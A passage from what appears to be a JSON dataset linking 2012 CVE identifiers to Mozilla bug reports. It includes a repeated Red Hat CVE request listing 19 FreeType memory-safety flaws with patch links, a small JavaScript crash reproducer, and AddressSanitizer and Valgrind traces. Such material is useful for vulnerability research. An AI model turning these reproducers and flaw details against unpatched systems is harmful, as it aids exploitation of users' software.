heap-based buffer read flaw by conversion of an ASCII string into a signed short integer by processing BDF fonts (FU#35658) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35658 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9c1659610f9cd5e103790cb5963483d65cf0d2d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800602 Issue #17: ========== freetype: Out-of heap-based buffer write by retrieval of advance values for glyph outlines (FU#35659) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35659 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d35a7dc7cc621538a1f4a63c83ebf223aace0b0 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800604 Issue #18: ========== freetype: Integer divide by zero by performing arithmetic computations for certain fonts (FU#35660) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35660 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ba67957d5ead443f4b6b31805d6e780d54361ca4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800606 Issue #19: ========== freetype: Out-of heap-based buffer write in the TrueType bytecode interpreter by moving zone2 pointer point (FU#35689) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35689 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0fc8debeb6c2f6a8a9a2b97332a7c8a0a1bd9e85 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800607"
      }
    ],
    "CVE-2012-1143": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=733512",
        "title": "FreeType: Multiple security flaws to be fixed in v2.4.9",
        "description": "We received a forward of this FreeType security issue. Per Dveditz, this is still used in Mobile Firefox. We should take the FreeType update to 2.4.9 since it looks like we still use 2.4.3 on Central (see http://mxr.mozilla.org/mozilla-central/source/modules/freetype2/ChangeLog). Date: Tue, 06 Mar 2012 20:57:12 +0100 From: Jan Lieskovsky <jlieskov@redhat.com> Subject: [oss-security] CVE Request -- FreeType: Multiple security flaws to be fixed in v2.4.9 Hello Kurt, Steve, vendors, we have been notified by Mateusz Jurczyk of the Google Security Team, about the following FreeType security flaws, which are going to be fixed in v2.4.9 version. Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another. But was lazy to cross-reference those, which of them is different from which another. Reproducers are attached to relevant upstream bug reports. Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not. And finally, due the count of the issues, not including full issues description under each entry (to shorten the request). Only particular Red Hat Bugzilla entry summary is included with relevant links to upstream bugs and commits. Further issue description can be found under particular Red Hat Bugzilla entry for each of them in initial comment (#c0). Kurt, Steve, could you allocate CVE identifiers for these? Thank you && Regards, Jan. -- Jan iankko Lieskovsky / Red Hat Security Response Team Issue #1: ========= freetype: Out-of heap-based buffer read by parsing, adding properties in BDF fonts, or validating if property being an atom (FU#35597, FU#35598) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35597 [2] https://savannah.nongnu.org/bugs/?35598 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=320d4976d1d010b5abe9d61a7423d8ca06bc34df Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800581 Issue #2: ========= freetype: Out-of heap-based buffer read by parsing glyph information and bitmaps for BDF fonts (FU#35599, FU#35600) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35599 [2] https://savannah.nongnu.org/bugs/?35600 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0b1c0c6b20bf121096afff206d570f26183402b3 Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800583 Issue #3: ========= freetype: NULL pointer dereference by moving zone2 pointer point for certain TrueType font (FU#35601) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35601 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=96cddb8d1d32d6738b06552083db9d6cee5b5cb4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800584 Issue #4: ========= freetype: Out-of heap-based buffer read when parsing certain SFNT strings by Type42 font parser (FU#35602) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35602 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=82365c0dead99dd119d9e7117cf4f36ce1d1cbe1 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800585 Issue #5: ========= freetype: Out-of heap-based buffer read by loading properties of PCF fonts (FU#35603) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35603 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c776fc17bfeaa607405fc96620e9445e7a0965c3 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800587 Issue #6: ========= freetype (64-bit specific): Out-of heap-based buffer read by attempt to record current cell into the cell table (FU#35604) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35604 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=fcbc82e69e7b114b0db75e955896107d611898e6 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800589 Issue #7: ========= freetype: Out-of heap-based buffer read flaw in Type1 font loader by parsing font dictionary entries (FU#35606) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35606 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=58cbc465d2ccd904dee755cff791fbb3a866646d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800590 Issue #8: ========= freetype: Out-of heap-based buffer write by parsing BDF glyph information and bitmaps (FU#35607) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35607 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=28dd2c45957278e962f95633157b6139de8170aa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800591 Issue #9: ========= freetype: Out-of heap-based buffer write in Type1 font parser by retrieving font's private dictionary (FU#35608) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35608 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9577add645c8c05460c7d60ad486c021394b82e Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800592 Issue #10: ========== freetype: Out-of heap-based buffer read in TrueType bytecode interpreter by executing NPUSHB and NPUSHW instructions (FU#35640) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35640 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=5dddcc45a03b336860436a180aec5b358517336b Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800593 Issue #11: ========== freetype: Out-of heap-based buffer write by parsing BDF glyph and bitmaps information with missing ENCODING field (FU#35641) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35641 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=4086fb7caf41e33137e548e43a49a97b127cd369 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800594 Issue #12: ========== freetype: Out-of heap-based buffer read by parsing BDF font header (FU#35643) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35643 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=cee5d593582801f65c5e127d9de9ca24ebcdc747 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800595 Issue #13: ========== freetype: Out-of heap-based buffer read in the TrueType bytecode interpreter by executing the MIRP instruction (FU#35646) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35646 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=a33c013fe2dc6e65de2879682201d9c155292349 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800597 Issue #14: ========== freetype: Array index error, leading to out-of stack based buffer read by parsing BDF font glyph information (FU#35656) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35656 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6ac022dc750d95296a6f731b9594f2e751d997fa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800598 Issue #15: ========== freetype: Out-of heap-based buffer read by conversion of PostScript font objects (FU#35657) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35657 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=292144b44a15c1a72f2ef76475d65b7a3a3fba67 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800600 Issue #16: ========== freetype: Out-of heap-based buffer read flaw by conversion of an ASCII string into a signed short integer by processing BDF fonts (FU#35658) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35658 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9c1659610f9cd5e103790cb5963483d65cf0d2d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800602 Issue #17: ========== freetype: Out-of heap-based buffer write by retrieval of advance values for glyph outlines (FU#35659) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35659 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d35a7dc7cc621538a1f4a63c83ebf223aace0b0 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800604 Issue #18: ========== freetype: Integer divide by zero by performing arithmetic computations for certain fonts (FU#35660) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35660 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ba67957d5ead443f4b6b31805d6e780d54361ca4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800606 Issue #19: ========== freetype: Out-of heap-based buffer write in the TrueType bytecode interpreter by moving zone2 pointer point (FU#35689) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35689 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0fc8debeb6c2f6a8a9a2b97332a7c8a0a1bd9e85 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800607"
      }
    ],
    "CVE-2012-1144": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=733512",
        "title": "FreeType: Multiple security flaws to be fixed in v2.4.9",
        "description": "We received a forward of this FreeType security issue. Per Dveditz, this is still used in Mobile Firefox. We should take the FreeType update to 2.4.9 since it looks like we still use 2.4.3 on Central (see http://mxr.mozilla.org/mozilla-central/source/modules/freetype2/ChangeLog). Date: Tue, 06 Mar 2012 20:57:12 +0100 From: Jan Lieskovsky <jlieskov@redhat.com> Subject: [oss-security] CVE Request -- FreeType: Multiple security flaws to be fixed in v2.4.9 Hello Kurt, Steve, vendors, we have been notified by Mateusz Jurczyk of the Google Security Team, about the following FreeType security flaws, which are going to be fixed in v2.4.9 version. Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another. But was lazy to cross-reference those, which of them is different from which another. Reproducers are attached to relevant upstream bug reports. Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not. And finally, due the count of the issues, not including full issues description under each entry (to shorten the request). Only particular Red Hat Bugzilla entry summary is included with relevant links to upstream bugs and commits. Further issue description can be found under particular Red Hat Bugzilla entry for each of them in initial comment (#c0). Kurt, Steve, could you allocate CVE identifiers for these? Thank you && Regards, Jan. -- Jan iankko Lieskovsky / Red Hat Security Response Team Issue #1: ========= freetype: Out-of heap-based buffer read by parsing, adding properties in BDF fonts, or validating if property being an atom (FU#35597, FU#35598) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35597 [2] https://savannah.nongnu.org/bugs/?35598 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=320d4976d1d010b5abe9d61a7423d8ca06bc34df Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800581 Issue #2: ========= freetype: Out-of heap-based buffer read by parsing glyph information and bitmaps for BDF fonts (FU#35599, FU#35600) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35599 [2] https://savannah.nongnu.org/bugs/?35600 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0b1c0c6b20bf121096afff206d570f26183402b3 Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800583 Issue #3: ========= freetype: NULL pointer dereference by moving zone2 pointer point for certain TrueType font (FU#35601) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35601 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=96cddb8d1d32d6738b06552083db9d6cee5b5cb4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800584 Issue #4: ========= freetype: Out-of heap-based buffer read when parsing certain SFNT strings by Type42 font parser (FU#35602) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35602 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=82365c0dead99dd119d9e7117cf4f36ce1d1cbe1 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800585 Issue #5: ========= freetype: Out-of heap-based buffer read by loading properties of PCF fonts (FU#35603) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35603 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c776fc17bfeaa607405fc96620e9445e7a0965c3 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800587 Issue #6: ========= freetype (64-bit specific): Out-of heap-based buffer read by attempt to record current cell into the cell table (FU#35604) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35604 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=fcbc82e69e7b114b0db75e955896107d611898e6 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800589 Issue #7: ========= freetype: Out-of heap-based buffer read flaw in Type1 font loader by parsing font dictionary entries (FU#35606) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35606 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=58cbc465d2ccd904dee755cff791fbb3a866646d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800590 Issue #8: ========= freetype: Out-of heap-based buffer write by parsing BDF glyph information and bitmaps (FU#35607) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35607 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=28dd2c45957278e962f95633157b6139de8170aa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800591 Issue #9: ========= freetype: Out-of heap-based buffer write in Type1 font parser by retrieving font's private dictionary (FU#35608) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35608 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9577add645c8c05460c7d60ad486c021394b82e Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800592 Issue #10: ========== freetype: Out-of heap-based buffer read in TrueType bytecode interpreter by executing NPUSHB and NPUSHW instructions (FU#35640) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35640 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=5dddcc45a03b336860436a180aec5b358517336b Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800593 Issue #11: ========== freetype: Out-of heap-based buffer write by parsing BDF glyph and bitmaps information with missing ENCODING field (FU#35641) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35641 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=4086fb7caf41e33137e548e43a49a97b127cd369 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800594 Issue #12: ========== freetype: Out-of heap-based buffer read by parsing BDF font header (FU#35643) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35643 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=cee5d593582801f65c5e127d9de9ca24ebcdc747 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800595 Issue #13: ========== freetype: Out-of heap-based buffer read in the TrueType bytecode interpreter by executing the MIRP instruction (FU#35646) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35646 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=a33c013fe2dc6e65de2879682201d9c155292349 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800597 Issue #14: ========== freetype: Array index error, leading to out-of stack based buffer read by parsing BDF font glyph information (FU#35656) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35656 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6ac022dc750d95296a6f731b9594f2e751d997fa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800598 Issue #15: ========== freetype: Out-of heap-based buffer read by conversion of PostScript font objects (FU#35657) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35657 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=292144b44a15c1a72f2ef76475d65b7a3a3fba67 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800600 Issue #16: ========== freetype: Out-of heap-based buffer read flaw by conversion of an ASCII string into a signed short integer by processing BDF fonts (FU#35658) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35658 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9c1659610f9cd5e103790cb5963483d65cf0d2d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800602 Issue #17: ========== freetype: Out-of heap-based buffer write by retrieval of advance values for glyph outlines (FU#35659) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35659 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d35a7dc7cc621538a1f4a63c83ebf223aace0b0 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800604 Issue #18: ========== freetype: Integer divide by zero by performing arithmetic computations for certain fonts (FU#35660) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35660 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ba67957d5ead443f4b6b31805d6e780d54361ca4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800606 Issue #19: ========== freetype: Out-of heap-based buffer write in the TrueType bytecode interpreter by moving zone2 pointer point (FU#35689) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35689 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0fc8debeb6c2f6a8a9a2b97332a7c8a0a1bd9e85 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800607"
      }
    ],
    "CVE-2012-1939": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=748613",
        "title": "[ESR] Assertion failure: [infer failure] Missing type pushed 0: float, at jsinfer.cpp:348",
        "description": "The following test asserts on mozilla-esr10 revision 65efc6ce102f (options -m -n -a): try { Object.prototype.nameSETS = 0; function ownProperties() { var props = {}; var r = function () {}; for (var a in r) { let (a = function() { for (var r=0;r<6;++r) ++a; }) { a(); } props[a] = true; } } ownProperties(); } catch(exc1) {} According to bisection, the issue might have been fixed on mozilla-central by this revision: The first good revision is: changeset: 83258:9272bb82eeba user: Luke Wagner date: Fri Oct 07 12:02:50 2011 -0700 summary: Bug 692274, part 3 - Remove JSOP_BLOCKCHAIN and JSOP_NULLBLOCKCHAIN, which produces incorrect let scoping until the next patch (r=jorendorff) Marking s-s because infer failures can be security related."
      }
    ],
    "CVE-2012-1940": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=747688",
        "title": "Heap-use-after-free in nsFrameList::FirstChild",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.162 Safari/535.19 Steps to reproduce: Tested on Aurora 20120421074909 http://hg.mozilla.org/releases/mozilla-aurora/rev/6f27de794daa and Trunk 20120419154942 http://hg.mozilla.org/mozilla-central/rev/c861d58b7ade ASAN stack:: ==18828== ERROR: AddressSanitizer heap-use-after-free on address 0x7fdb84d6bd80 at pc 0x7fdbafbd1f54 bp 0x7fffecab7970 sp 0x7fffecab7968 READ of size 8 at 0x7fdb84d6bd80 thread T0 #0 0x7fdbafbd1f54 in nsFrameList::FirstChild() const /usr/local/google/home/aarya/firefox/aurora-src/modules/zlib/src/inffast.c:0 #1 0x7fdb8ac27660 in 0x7fdb84d6bd80 is located 0 bytes inside of 16-byte region [0x7fdb84d6bd80,0x7fdb84d6bd90) freed by thread T0 here: #0 0x410dd2 in free ??:0 #1 0x7fdbafd55b96 in operator delete(void*) /usr/local/google/home/aarya/firefox/aurora-src/../../dist/include/mozilla/mozalloc.h:253 #2 0x2000007fdbaf8308 previously allocated by thread T0 here: #0 0x410e92 in malloc ??:0 #1 0x7fdbb5469450 in moz_xmalloc /usr/local/google/home/aarya/firefox/aurora-src/memory/mozalloc/mozalloc.cpp:103 ==18828== ABORTING Stats: 162M malloced (161M for red zones) by 345347 calls Stats: 43M realloced by 19180 calls Stats: 131M freed by 228972 calls Stats: 0M really freed by 0 calls Stats: 356M (91189 full pages) mmaped in 89 calls mmaps by size class: 8:262128; 9:57337; 10:20475; 11:16376; 12:3072; 13:2048; 14:1536; 15:384; 16:704; 17:224; 18:128; 19:56; 20:16; mallocs by size class: 8:254495; 9:49981; 10:18431; 11:15427; 12:2334; 13:1818; 14:1464; 15:381; 16:639; 17:199; 18:116; 19:49; 20:13; frees by size class: 8:154593; 9:40949; 10:15619; 11:12669; 12:1671; 13:991; 14:1276; 15:335; 16:566; 17:185; 18:63; 19:45; 20:10; rfrees by size class: Stats: malloc large: 377 small slow: 1901 Shadow byte and word: 0x1ffb709ad7b0: fd 0x1ffb709ad7b0: fd fd fd fd fd fd fd fd More shadow bytes: 0x1ffb709ad790: fd fd fd fd fd fd fd fd 0x1ffb709ad798: fd fd fd fd fd fd fd fd 0x1ffb709ad7a0: fa fa fa fa fa fa fa fa 0x1ffb709ad7a8: fa fa fa fa fa fa fa fa =>0x1ffb709ad7b0: fd fd fd fd fd fd fd fd 0x1ffb709ad7b8: fd fd fd fd fd fd fd fd 0x1ffb709ad7c0: fa fa fa fa fa fa fa fa 0x1ffb709ad7c8: fa fa fa fa fa fa fa fa 0x1ffb709ad7d0: fd fd fd fd fd fd fd fd Valgrind stack:: ==19089== Invalid read of size 8 ==19089== at 0x85360B8: nsFrameList::FirstChild() const (nsFrameList.h:246) ==19089== by 0x862C43C: nsOverflowContinuationTracker::Finish(nsIFrame*) (nsContainerFrame.cpp:1724) ==19089== by 0x861FCF9: nsBlockReflowContext::ReflowBlock(nsRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, nsHTMLReflowState&, unsigned int&, nsBlockReflowState&) (nsBlockReflowContext.cpp:333) ==19089== by 0x8615899: nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) (nsBlockFrame.cpp:3202) ==19089== by 0x8614071: nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) (nsBlockFrame.cpp:2511) ==19089== by 0x8612C93: nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) (nsBlockFrame.cpp:2022) ==19089== by 0x8610E7B: nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) (nsBlockFrame.cpp:1071) ==19089== by 0x862A824: nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) (nsContainerFrame.cpp:941) ==19089== by 0x862774C: nsColumnSetFrame::ReflowChildren(nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&, nsColumnSetFrame::ReflowConfig const&, bool, nsCollapsingMargin*, nsColumnSetFrame::ColumnBalanceData&) (nsColumnSetFrame.cpp:704) ==19089== by 0x8628575: nsColumnSetFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) (nsColumnSetFrame.cpp:1066) ==19089== by 0x861FC1B: nsBlockReflowContext::ReflowBlock(nsRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, nsHTMLReflowState&, unsigned int&, nsBlockReflowState&) (nsBlockReflowContext.cpp:295) ==19089== by 0x8615899: nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) (nsBlockFrame.cpp:3202) ==19089== Address 0x1de137f0 is 0 bytes inside a block of size 16 free'd ==19089== at 0x4C2779F: free (vg_replace_malloc.c:427) ==19089== by 0x69DF1A3: moz_free (mozalloc.cpp:81) ==19089== by 0x862BA11: nsContainerFrame::RemovePropTableFrame(nsPresContext*, nsIFrame*, mozilla::FramePropertyDescriptor const*) (mozalloc.h:253) ==19089== by 0x862B377: nsContainerFrame::StealFrame(nsPresContext*, nsIFrame*, bool) (nsContainerFrame.cpp:1226) ==19089== by 0x861B7DA: nsBlockFrame::StealFrame(nsPresContext*, nsIFrame*, bool) (nsBlockFrame.cpp:5654) ==19089== by 0x862B827: nsContainerFrame::DeleteNextInFlowChild(nsPresContext*, nsIFrame*, bool) (nsContainerFrame.cpp:1372) ==19089== by 0x861BC1B: nsBlockFrame::DeleteNextInFlowChild(nsPresContext*, nsIFrame*, bool) (nsBlockFrame.cpp:5742) ==19089== by 0x861FD2B: nsBlockReflowContext::ReflowBlock(nsRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, nsHTMLReflowState&, unsigned int&, nsBlockReflowState&) (nsBlockReflowContext.cpp:335) ==19089== by 0x8615899: nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) (nsBlockFrame.cpp:3202) ==19089== by 0x8614071: nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) (nsBlockFrame.cpp:2511) ==19089== by 0x8612C93: nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) (nsBlockFrame.cpp:2022) ==19089== by 0x8610E7B: nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) (nsBlockFrame.cpp:1071) ==19089=="
      }
    ],
    "CVE-2012-1941": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=750066",
        "title": "Out of bounds read in nsHTMLReflowState::CalculateHypotheticalBox, with nested multi-column, relative position, and absolute position",
        "description": "Reproduces on ASANified aurora, trunk. Load attached testcase and resize browser window to reproduce crash. ================================================================= ==27281== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f188f6581b4 at pc 0x7f18b95a4375 bp 0x7fffcea2e310 sp 0x7fffcea2e308 READ of size 4 at 0x7f188f6581b4 thread T0 #0 0x7f18b95a4375 in nsLineBox::Contains(nsIFrame*) const firefox/aurora/layout/generic/nsLineBox.h:547 #1 0x7f18b95cb325 in nsBlockInFlowLineIterator firefox/aurora/layout/generic/nsBlockFrame.cpp:5261 #2 0x7f18b983b03f in nsHTMLReflowState::CalculateHypotheticalBox(nsPresContext*, nsIFrame*, nsIFrame*, int, int, nsHTMLReflowState const*, nsHypotheticalBox&, nsIAtom*) firefox/aurora/layout/generic/nsHTMLReflowState.cpp:987 #3 0x7f18b984058e in nsHTMLReflowState::InitAbsoluteConstraints(nsPresContext*, nsHTMLReflowState const*, int, int, nsIAtom*) firefox/aurora/layout/generic/nsHTMLReflowState.cpp:1186 #4 0x7f18b9831ec4 in nsHTMLReflowState::InitConstraints(nsPresContext*, int, int, nsMargin const*, nsMargin const*, nsIAtom*) firefox/aurora/layout/generic/nsHTMLReflowState.cpp:1878 #5 0x7f18b98280af in nsHTMLReflowState::Init(nsPresContext*, int, int, nsMargin const*, nsMargin const*) firefox/aurora/layout/generic/nsHTMLReflowState.cpp:291 #6 0x7f18b9829d49 in nsHTMLReflowState firefox/aurora/layout/generic/nsHTMLReflowState.cpp:180 #7 0x7f18b954974b in nsAbsoluteContainingBlock::ReflowAbsoluteFrame(nsIFrame*, nsPresContext*, nsHTMLReflowState const&, int, int, bool, nsIFrame*, unsigned int&, nsOverflowAreas*) 